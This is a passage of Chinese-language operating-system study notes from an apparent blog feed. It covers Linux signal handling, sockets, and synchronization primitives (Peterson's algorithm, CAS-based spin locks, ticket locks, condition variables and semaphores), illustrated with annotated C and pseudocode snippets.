<p>步骤<code>2</code>Linux完成从内核到用户态的切换后（转向<code>handler</code>），就会把【相关栈状态】和【上下文】清空，所以为了避免执行完<code>handler</code>返回时无法恢复到当初系统调用时候用户态的上下文等，在切换到用户态执行<code>handler</code>时，<code>Linux</code>会将【<code>syscall</code>的返回值】和【此前的用户态的上下文（PC，register等）】保存在【用户栈】上。因此步骤<code>4</code>就会从用户栈上提取上下文等信息以恢复到当初系统调用时候的环境。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart TD    </span><br><span class="line">    subgraph usr</span><br><span class="line">    B(调用syscall1)</span><br><span class="line">    C(handler) --&gt; D(sigreturn)</span><br><span class="line">    end</span><br><span class="line">    </span><br><span class="line">    subgraph kern</span><br><span class="line">    A1(syscall1) --&gt; A2(ret_to_user)</span><br><span class="line">    A3(sigreturn) --&gt; A4(ret_to_user)</span><br><span class="line">    end</span><br><span class="line">    </span><br><span class="line">    B --&gt;|1.用户态进程系统调用进入内核态| A1</span><br><span class="line">    A2 --&gt;|2.内核态处理完系统调用时,\n发现有signal,于是切换到\n用户态处理函数位置,让其处理信号事件| C</span><br><span class="line">    D --&gt; |3.信号处理完后,信号处理函数\n会通过系统调用sigreturn返回内核.\n该系统调用的主要作用即辅助内核\n恢复到被信号打断之前的上下文context|A3</span><br><span class="line">    A4 --&gt; |4.继续完成在系统调用被打断时的任务,\n即syscall返回时回到原用户态|B</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>可重入<code>reentrant</code>函数：允许多个任务（☞对信号事件的响应和处理）并发使用，而不必担心【共享数据】的错误</p>
<ul>
<li>实现可重入函数的前提<ul>
<li>不使用<code>static data</code>或者<code>static data</code>只读</li>
<li>尽量只是用<code>local data</code></li>
<li>在必须使用全局共享数据的时候，需要保护对全局数据的访问（防止死锁）</li>
<li>避免在函数中修改自己的代码</li>
<li>不调用【不可重入函数】，很多常见的库函数的实现（如<code>malloc</code>）都是不可重入的</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h4><ul>
<li><p>客户端通过【地址】找到要调用的服务端进程</p>
<ul>
<li><code>IP + port</code>：通信双方通常使用【本地回环地址<code>127.0.0.1</code>】，然后各自绑定在不同的端口上，OS网络协议栈可以识别回环地址，将通信转发到目标端口对应的进程</li>
<li><code>UNIX domain socket</code>：本地文件系统的一个路径</li>
</ul>
</li>
<li><p>协议</p>
<ul>
<li>传输控制协议<code>TCP : Transmission Control Protocol</code><ul>
<li>可靠性好</li>
<li>（数据丢失情况下）数据重传</li>
<li>（数据乱序到达情况下）数据顺序维护</li>
</ul>
</li>
<li>用户数据报协议<code>UDP : User Datagram Protocol</code><ul>
<li>简单</li>
<li>传输性能较好</li>
</ul>
</li>
</ul>
</li>
<li><p><code>Linux</code>套接字</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">socket(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol);</span><br><span class="line">* domain: 寻址方式, [IP + port] or [local path];</span><br><span class="line">* type: 通信方式, [SOCK_STREAM](数据流,对应[TCP]) or [SOCK_DGRAM](数据报,对应[UDP])</span><br><span class="line">* protocol: 定义协议相关配置, [TCP] or [UDP];</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>system</category>
      </categories>
      <tags>
        <tag>operating system</tag>
        <tag>system</tag>
      </tags>
  </entry>
  <entry>
    <title>OS Notes Part(II)</title>
    <url>/2022/07/07/system/os-notes-second/</url>
    <content><![CDATA[<h1 id="Modern-Operating-System-II"><a href="#Modern-Operating-System-II" class="headerlink" title="Modern Operating System (II)"></a>Modern Operating System (II)</h1><blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> 同步原语</li>
<li><input checked="" disabled="" type="checkbox"> 文件系统</li>
<li><input disabled="" type="checkbox"> 设备管理</li>
</ul>
</blockquote>
<h2 id="8-同步原语"><a href="#8-同步原语" class="headerlink" title="8 同步原语"></a>8 同步原语</h2><hr>
<ul>
<li>同步原语<code>synchronization primitive</code>：正确高效处理多线程多核等的同步问题的抽象<ul>
<li>将海量数据根据核心数量划分，从而能够在同一时间分配子任务到多个核心上并行处理，并最终收集这些子任务的处理结果。</li>
<li>意味着对共享资源的并发访问。</li>
<li>生产者：处理这些划分数据的线程</li>
<li>消费者：收集处理结果的线程</li>
<li>多核CPU：任务可以被划分给不同CPU核心上的线程同时处理</li>
<li>单核CPU：多线程可能营造每个线程在单独CPU上的“假象”</li>
</ul>
</li>
</ul>
<h3 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h3><ul>
<li><p>竞争冒险<code>race hazard</code>：程序的正确性依赖于特定的执行顺序的情况</p>
</li>
<li><p>互斥访问<code>mutual exclusion</code>：任意时刻只允许至多一个线程<code>thread</code>访问的方式</p>
</li>
<li><p>临界区<code>critical section</code>：保证<strong>互斥访问共享资源</strong>的代码区域</p>
<ul>
<li>在同一时刻，至多只有一个线程可以执行临界区中的代码</li>
<li>在临界区内，一个线程可以安全地对共享资源进行操作</li>
</ul>
</li>
<li><p>临界区问题：如何通过设计<strong>协议</strong>来保证<strong>互斥访问临界区</strong>的问题</p>
<ul>
<li><p>适用范围</p>
<ul>
<li>多核并行，多核多线程</li>
<li>单核多线程</li>
</ul>
</li>
<li><p>流程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  --- 申请进入临界区 ---</span><br><span class="line">          临界区</span><br><span class="line">  --- 标识退出临界区 ---</span><br><span class="line">  other(); <span class="comment"># 其他代码</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>软件实现的要求</p>
<blockquote>
<p> 算法设计</p>
</blockquote>
<ol>
<li>互斥访问</li>
<li>有限等待</li>
<li>空闲让进</li>
</ol>
</li>
<li><p>硬件实现</p>
<blockquote>
<p>（单核）关闭中断，但不适用于多核</p>
</blockquote>
<ul>
<li>线程<code>thread</code>进入临界区关闭中断，离开临界区后再开启中断</li>
</ul>
</li>
</ul>
</li>
<li><p>软件实现：皮特森算法</p>
<blockquote>
<ol>
<li>经典皮特森算法只能用于两个线程的情况</li>
<li><code>Micha Hofri</code>扩展了皮特森算法，使其能够被使用与任意数量的线程</li>
<li>皮特森算法要求<code>CPU</code>严格按照<strong>程序顺序</strong>执行<strong>访存操作</strong></li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> flag[<span class="number">2</span>] = &#123; <span class="literal">false</span> &#125;;<span class="comment">// flag[0]-&gt;thread_0 ; flag[1]-&gt;thread_1</span></span><br><span class="line"><span class="type">int</span> turn;</span><br><span class="line"></span><br><span class="line">--- Thread <span class="number">0</span> ---</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">  flag[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">  turn = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (flag[<span class="number">1</span>]==<span class="literal">true</span> &amp;&amp; turn==<span class="number">1</span>);</span><br><span class="line">  critical_section();<span class="comment">//临界区</span></span><br><span class="line">  flag[<span class="number">0</span>] = <span class="literal">false</span>;</span><br><span class="line">  other_code();<span class="comment">//其他代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--- Thread <span class="number">1</span> ---</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">  flag[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">  turn = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(flag[<span class="number">0</span>]==<span class="literal">true</span> &amp;&amp; trun == <span class="number">0</span>);</span><br><span class="line">  critical_section();<span class="comment">//临界区</span></span><br><span class="line">  flag[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">  other_code();<span class="comment">//其他代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>软硬件结合：原子操作 –&gt; 互斥锁</p>
<ul>
<li><p>原子操作<code>atomic operation</code>：指不可被打断的一个或一系列操作，要么这一系列指令都执行完成，要么这一系列指令一条都没有执行，不会出现执行到一半的状态。</p>
<ul>
<li><p>常见原子操作：比较与置换<code>Compare-And-Swap, CAS</code>，拿取并累加<code>Fetch-And-Add, FAA</code></p>
<blockquote>
<p><code>CAS</code>和<code>FFA</code>类C代码的实现（只是用来说明功能，C代码本身不具备原子性）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CAS</span><span class="params">(<span class="type">int</span> *addr, <span class="type">int</span> expected, <span class="type">int</span> new_value)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (*addr == expected) *addr = new_value;</span><br><span class="line">  <span class="keyword">else</span> expected = *addr;</span><br><span class="line">  <span class="keyword">return</span> expected;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">FFA</span><span class="params">(<span class="type">int</span> *addr, <span class="type">int</span> add_value)</span> &#123;</span><br><span class="line">  <span class="type">int</span> tmp = *addr;</span><br><span class="line">  *addr = tmp + add_value;</span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>更新遗失<code>loss update</code></p>
</li>
<li><p><code>Intel x86-64</code>平台内联汇编实现原子操作</p>
<blockquote>
<p><code>Intel</code>平台通过<code>lock</code>前缀来实现操作的原子性</p>
<p><code>atomic_CAS</code>解析</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> *addr == expected:</span><br><span class="line">*addr = new_value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">expected = *addr</span><br></pre></td></tr></table></figure>

<p>比较地址<code>addr</code>处的值<code>*addr</code>和<code>expected</code>，如果相等：<code>*addr = new_value</code>；否则：<code>expected = *addr</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">atomic_CAS</span><span class="params">(<span class="type">int</span> *addr, <span class="type">int</span> expected, <span class="type">int</span> new_value)</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lock cmpxchg %[new], %[ptr]&quot;</span></span></span><br><span class="line"><span class="params">              :<span class="string">&quot;+a&quot;</span>(expected), [ptr] <span class="string">&quot;+m&quot;</span>(*addr)</span></span><br><span class="line"><span class="params">              :[new] <span class="string">&quot;r&quot;</span>(new_value)</span></span><br><span class="line"><span class="params">              :<span class="string">&quot;memory&quot;</span>)</span>;</span><br><span class="line">  <span class="keyword">return</span> expected;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>ARM</code>平台基于<code>Load-Link/Store-Conditional (LL/SC)</code>指令组合‘</p>
<ul>
<li><code>ARMv8.1</code>支持了<code>LSE(Large System Extension)</code>，可以使用单条指令完成原子操作<ul>
<li><code>Load-Link</code>：<ul>
<li>监视器<code>monitor</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>互斥锁<code>mutex lock</code></p>
<ul>
<li><p>自旋锁<code>spin lock</code>：基于原子的<code>CAS</code>实现</p>
<blockquote>
<ol>
<li>此处不考虑<strong>访存操作乱序的问题</strong></li>
<li>满足 2 项，无法确保<strong>公平性</strong><ul>
<li><input checked="" disabled="" type="checkbox"> 互斥访问</li>
<li><input disabled="" type="checkbox"> 有限等待</li>
<li><input checked="" disabled="" type="checkbox"> 空闲让进</li>
</ul>
</li>
<li>实现简单，低时延高效率</li>
<li>异构（ARM移动CPU大小核架构，小核运行频率低与大核竞争不易拿到锁），无法保证公平性</li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># implementation of spin lock by C language</span></span><br><span class="line"><span class="meta"># lock == 1 : 有人拿了锁</span></span><br><span class="line"><span class="meta"># lock == 0 : 该锁空闲</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_init</span><span class="params">(<span class="type">int</span> *lock)</span> &#123;</span><br><span class="line">  *lock = <span class="number">0</span>;<span class="comment">//初始化自旋锁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">int</span> *lock)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span>(atomic_CAS(lock, <span class="number">0</span>, <span class="number">1</span>) != <span class="number">0</span>);<span class="comment">//循环忙等</span></span><br><span class="line">--+</span><br><span class="line">  +-&gt; 判断lock是否空闲,如果空闲,则上锁;不空闲,则一直在循环中等待</span><br><span class="line">  +-&gt; <span class="keyword">if</span> lock==<span class="number">0</span> -&gt; lock=<span class="number">1</span>,<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">  +-&gt; <span class="keyword">if</span> lock==<span class="number">1</span> -&gt; expected=lock=<span class="number">1</span>,<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">--+</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> unlock(<span class="type">int</span> *lock) &#123;</span><br><span class="line">  *lock = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
<li><p>排号自旋锁（或排号锁）<code>ticket lock</code>：利用原子的<code>FFA</code>实现</p>
<blockquote>
<ol>
<li>按照竞争者申请锁的顺序传递锁，锁的竞争者组成了<code>FIFO</code>等待队列</li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">## 此处没有考虑 integer overflow</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock</span> &#123;</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> owner;<span class="comment">//当前lock持有者序号</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> next;<span class="comment">//下一个要分发lock的竞争者的序号</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_init</span><span class="params">(<span class="keyword">struct</span> lock *lock)</span> &#123;</span><br><span class="line">  <span class="comment">//初始化排号锁</span></span><br><span class="line">  lock-&gt;owner = <span class="number">0</span>;</span><br><span class="line">  lock-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="keyword">struct</span> lock *lock)</span> &#123;</span><br><span class="line">  <span class="comment">//拿取自己的序号</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> my_ticket = atomic_FAA(&amp;lock-&gt;next, <span class="number">1</span>);<span class="comment">// 取号排队</span></span><br><span class="line">  <span class="keyword">while</span> (lock-&gt;owner != my_ticket);<span class="comment">//循环忙等,如果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">(<span class="keyword">struct</span> lock*lock)</span> &#123;</span><br><span class="line">  <span class="comment">//传递给下一个竞争者</span></span><br><span class="line">  lock-&gt;owner++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h3><ul>
<li><p>循环等待<code>busy looping</code>：如剩余资源为0时，<code>producer</code>会陷入循环等待&#x2F;循环忙直到<code>consumer</code>释放空位。</p>
<ul>
<li>需要挂起&#x2F;唤醒机制 —&gt; 避免<code>busy looping</code>导致<code>CPU</code>资源浪费</li>
<li>引入条件变量<code>condition variable</code></li>
</ul>
</li>
<li><p><code>Condition Variable</code> 提供了两个接口：<code>cond_wait</code> and <code>cond_signal</code></p>
<ul>
<li><code>cond_wait</code> ：用于挂起当前<code>process</code></li>
<li><code>cond_signal</code>：用于唤醒等待在该<code>condition variable</code>上的线程<code>thread</code></li>
</ul>
</li>
<li><p>生产者消费者问题：基于<code>condition variable</code></p>
<blockquote>
<ol>
<li>使用互斥锁保护计数器：<code>empty_cnt_lock</code>保护<code>empty_slot</code>，<code>filled_cnt_lock</code>保护<code>filled_slot</code></li>
<li>使用条件变量时必须配合<code>mutex lock</code>使用</li>
<li><code>cond_wait</code>在挂起当前<code>thread</code>的同时，该互斥锁<code>mutex lock</code>会被原子地释放</li>
<li>挂起的线程被唤醒后，其会在<code>cond_wait</code>返回之前重新获取互斥锁<code>mutex lock</code></li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> empty_slot = <span class="number">5</span>; ---&gt; 公共变量,由锁 empty_cnt_lock 保护</span><br><span class="line"><span class="type">int</span> filled_slot = <span class="number">0</span>; ---&gt; 公共变量,由锁 filled_cnt_lock 保护</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cond</span> <span class="title">empty_cond</span>;</span> ---&gt; 条件变量:生产者 --&gt; 缓冲区无空位</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock</span> <span class="title">empty_cnt_lock</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cond</span> <span class="title">filled_cond</span>;</span> ---&gt; 条件变量:消费者 --&gt; 缓冲区无数据</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock</span> <span class="title">filled_cnt_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">producer</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> new_msg;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        new_msg = produce_new();</span><br><span class="line"><span class="comment">//        </span></span><br><span class="line">        lock(&amp;empty_cnt_lock);</span><br><span class="line">        	<span class="keyword">while</span>(empty_slot==<span class="number">0</span>)</span><br><span class="line">                cond_wait(&amp;empty_cond, &amp;empty_cnt_lock); </span><br><span class="line">        			--&gt; 当有新的空位产生时候,消费者会利用cond_signal操作唤醒等待在empty_cond上的</span><br><span class="line">                     --&gt; 生产者</span><br><span class="line">        	empty_slot--;</span><br><span class="line">        unlock(&amp;empty_cnt_lock);</span><br><span class="line">        </span><br><span class="line">        buffer_add_safe(new_msg);</span><br><span class="line">        </span><br><span class="line">        lock(&amp;filled_cnt_lock);</span><br><span class="line">        	filled_slot++;</span><br><span class="line">        	cond_signal(&amp;filled_cond); --&gt; 唤醒等待的消费者</span><br><span class="line">        unlock(&amp;filled_cnt_lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> cur_msg;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        lock(&amp;filled_cnt_lock);</span><br><span class="line">        	<span class="keyword">while</span>(filled_slot==<span class="number">0</span>)</span><br><span class="line">                cond_wait(&amp;filled_cond, &amp;filled_cnt_lock);</span><br><span class="line">        	filled_slot--;</span><br><span class="line">        unlock(&amp;filled_cnt_lock);</span><br><span class="line">        </span><br><span class="line">        cur_msg = buffer_remove_safe();</span><br><span class="line">        </span><br><span class="line">        lock(&amp;empty_cnt_lock);</span><br><span class="line">        	empty_slot++;</span><br><span class="line">        	cond_signal(&amp;empty_cond);</span><br><span class="line">        unlock(&amp;empty_cnt_lock);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>条件变量的实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cond</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">wait_list</span>;</span> --&gt; 记录等待在该条件变量上的线程</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cond_wait</span><span class="params">(<span class="keyword">struct</span> cond *cond, <span class="keyword">struct</span> lock*mutex)</span> &#123;</span><br><span class="line">    list_append(cond-&gt;wait_list, thread_self()); --&gt; 将当前线程thread_self()加入等待队列</span><br><span class="line">    atomic_block_unlock(mutex); --&gt; 原子地挂起并同时释放锁,这两步必须是原子的</span><br><span class="line">             --&gt; 此时已经挂起并且释放了锁</span><br><span class="line">             --&gt; 这个过程应由OS辅助完成,Linux kernel 通过 futex 机制实现该功能</span><br><span class="line">        </span><br><span class="line">    lock(mutex); --&gt; 重新获得互斥锁</span><br><span class="line">                 --&gt; 该步骤是接收到cond_signal唤醒挂起的线程后紧接着执行的</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cond_signal</span><span class="params">(<span class="keyword">struct</span> cond *cond)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!list_empty(cond-&gt;wait_list))</span><br><span class="line">        wakeup(list_remove(cond-&gt;wait_list)); --&gt; OS提供的唤醒服务</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cond_broadcast</span><span class="params">(<span class="keyword">struct</span> cond *cond)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(!list_empty(cond-&gt;wait_list))</span><br><span class="line">        wakeup(list_remove(cond-&gt;wait_list));</span><br><span class="line">&#125; --&gt; 条件变量一般提供广播操作用来唤醒所有等待在条件变量上的线程`thread`</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><ul>
<li><p>信号量<code>semaphore</code>：在不同线程之间充当信号灯，根据<strong>剩余资源数量</strong>控制不同线程的<strong>执行</strong>或者<strong>等待</strong></p>
<ul>
<li><p>除了初始化，只支持两种操作用来更新，信号量又叫做<code>PV原语</code></p>
<ul>
<li><code>init</code>：初始化工作，即赋予信号量<code>semaphore</code>初始值</li>
<li><code>P (荷兰语 Proberen 检验)</code>：<code>wait</code></li>
<li><code>V (荷兰语 Verhogen 自增)</code>：<code>signal</code></li>
</ul>
</li>
<li><p>信号量用来【辅助控制多个线程访问 <em><strong>有限数量</strong></em>  的 <em><strong>共享资源</strong></em>  的】，只允许三个不同的操作对齐值进行修改<code>init, wait(P) and signal(V)</code></p>
<ul>
<li><p>信号量的角度：</p>
<ul>
<li>消耗<strong>共享资源</strong>的线程：<code>wait</code> –&gt; 等待资源就绪</li>
<li>产生&#x2F;释放<strong>共享资源</strong>的线程：<code>signal</code> –&gt; 通知资源就绪，即<strong>被释放的资源</strong>的量</li>
</ul>
</li>
<li><p>资源角度</p>
<ul>
<li>对于<code>producer</code>【<strong>共享资源</strong>】是空闲空间<code>free space</code></li>
<li>对于<code>consumer</code>【<strong>共享资源</strong>】是已占用的空间</li>
</ul>
</li>
<li><p>生产者消费者问题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> empty_slot;</span><br><span class="line"><span class="type">sem_t</span> filled_slot; --&gt; 两个信号量</span><br><span class="line"><span class="type">void</span> <span class="title function_">producer</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> new_msg;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        new_msg = produce_new();</span><br><span class="line">        wait(&amp;empty_slot); --&gt; P</span><br><span class="line">        	<span class="title function_">buffer_add_safe</span><span class="params">(new_msg)</span>;</span><br><span class="line">        signal(&amp;filled_slot); --&gt; V</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> cur_msg;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        wait(&amp;filled_slot); --&gt; P</span><br><span class="line">        	cur_msg = buffer_remove_safe();</span><br><span class="line">        signal(&amp;empty_slot); --&gt; V</span><br><span class="line">        	<span class="title function_">consume_msg</span><span class="params">(cur_msg)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>信号量的实现</p>
<ul>
<li>只有一个资源被释放时，同时通知多个<code>thread</code>是不明智的策略，应让多余的<code>thread</code>挂起并放弃<code>CPU</code></li>
<li>使用<code>condition variable</code>和<code>mutex lock</code>实现<code>semaphore</code></li>
<li>该实现不能保证<code>thread</code>按照调用<code>wait</code>的顺序依次拿到资源，但并不会破坏对有限等待的保证</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sem</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> value; --&gt; value&gt;=<span class="number">0</span>,无thread等待,value=剩余资源数量</span><br><span class="line">          --&gt; value&lt;<span class="number">0</span>,有thread等待,|value|=number of threads which are waiting</span><br><span class="line">    <span class="type">int</span> wakeup; --&gt; 有线程等待时可用资源数量,亦即应该唤醒的thread数量</span><br><span class="line">          --&gt; wakeup&gt;=<span class="number">0</span></span><br><span class="line">    <span class="keyword">struct</span> lock sem_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cond</span> <span class="title">sem_cond</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">wait</span><span class="params">(<span class="keyword">struct</span> sem*s)</span> &#123;</span><br><span class="line">    lock(&amp;s-&gt;sem_lock);<span class="comment">//上锁</span></span><br><span class="line">    s-&gt;value--;</span><br><span class="line"></span><br><span class="line">---------------- <span class="keyword">if</span> value&gt;=<span class="number">0</span>,有空闲资源,wait执行完毕</span><br><span class="line">    	<span class="keyword">if</span>(s-&gt;value&lt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                cond_wait(&amp;s-&gt;sem_cond, &amp;s-&gt;sem_lock);</span><br><span class="line">            &#125;<span class="keyword">while</span>(s-&gt;wakeup==<span class="number">0</span>); --&gt; <span class="keyword">do</span>...<span class="keyword">while</span> 语句很关键,先排队后检查</span><br><span class="line">               					--&gt; 避免了某一线程调用完signal</span><br><span class="line">                				--&gt; 立即调用wait导致其他thread进入无线等待中</span><br><span class="line">            s-&gt;wakeup--;</span><br><span class="line">        &#125;</span><br><span class="line">---------------- <span class="keyword">if</span> value&lt;<span class="number">0</span>,value不能表示当前可用资源数量,需要检查wakeup;</span><br><span class="line">---------------- <span class="keyword">if</span> wakeup&gt;<span class="number">0</span>,有可用资源(只不过需要排队);</span><br><span class="line">---------------- <span class="keyword">if</span> wakeup==<span class="number">0</span>,没有可用资源,此时需要挂起</span><br><span class="line"></span><br><span class="line">    unlock(&amp;s-&gt;sem_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal</span><span class="params">(<span class="keyword">struct</span> sem *s)</span> &#123;</span><br><span class="line">    lock(&amp;sem_lock);</span><br><span class="line">    	s-&gt;value++;</span><br><span class="line">    	<span class="keyword">if</span> (s-&gt;value&lt;=<span class="number">0</span>) &#123; </span><br><span class="line">--&gt; 当s-&gt;value&lt;=<span class="number">0</span>时(还是已经++过的value值,说明value原本是负数)</span><br><span class="line">--&gt; 此时有thread等待,因此添加的资源也体现在wakeup上</span><br><span class="line">--&gt; 正因为此时有thread等待,所以增加wakeup的值并唤醒这些正在等待的</span><br><span class="line">--&gt; 线程的其中一个来利用新增加的资源</span><br><span class="line">            s-&gt;wakeup++;</span><br><span class="line">            cond_signal(&amp;s-&gt;sem_cond); </span><br><span class="line">--&gt; wakeup资源增多,即唤醒之前wakeup=<span class="number">0</span>导致的挂起等待</span><br><span class="line">--&gt; 至少wakeup=<span class="number">1</span>,因此之前因为wakeup=<span class="number">0</span>挂起的线程也被唤醒了</span><br><span class="line">        &#125;</span><br><span class="line">    unlock(&amp;sem_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h4><ul>
<li>信号量：协调多个线程对一系列共享资源的有序操作</li>
<li>信号量与互斥锁：<ul>
<li>区别较大</li>
</ul>
</li>
<li>条件变量与信号量：<ul>
<li>信号量是由条件变量，互斥锁，以及计数器实现的</li>
<li>计数器是信号量的核心，用于表示当前可用资源的数量</li>
</ul>
</li>
<li>条件变量与互斥锁：<ul>
<li>互斥锁<code>mutex lock</code>：解决临界区问题，保证互斥访问共享资源</li>
<li>条件变量<code>condition variable</code>：提供【挂起 &#x2F; 唤醒】机制，避免循环等待<code>busy looping</code>，节省<code>CPU</code>资源</li>
<li>二者搭配使用</li>
</ul>
</li>
</ul>
<h3 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h3><ul>
<li><p>对共享资源的读操作是不互斥的</p>
</li>
<li><p>只需要保证<strong>写共享数据的线程</strong>和<strong>读共享数据的线程</strong>不能同时执行即可，读写锁<code>reader writer lock</code>即解决此问题的一种同步原语<code>synchronization primitive</code></p>
</li>
<li><p><code>critical seection</code>：</p>
<ul>
<li>读临界区：可写，可读</li>
<li>写临界区：（别的）不可写，不可读</li>
</ul>
</li>
<li><p><code>reader writer lock</code>使用</p>
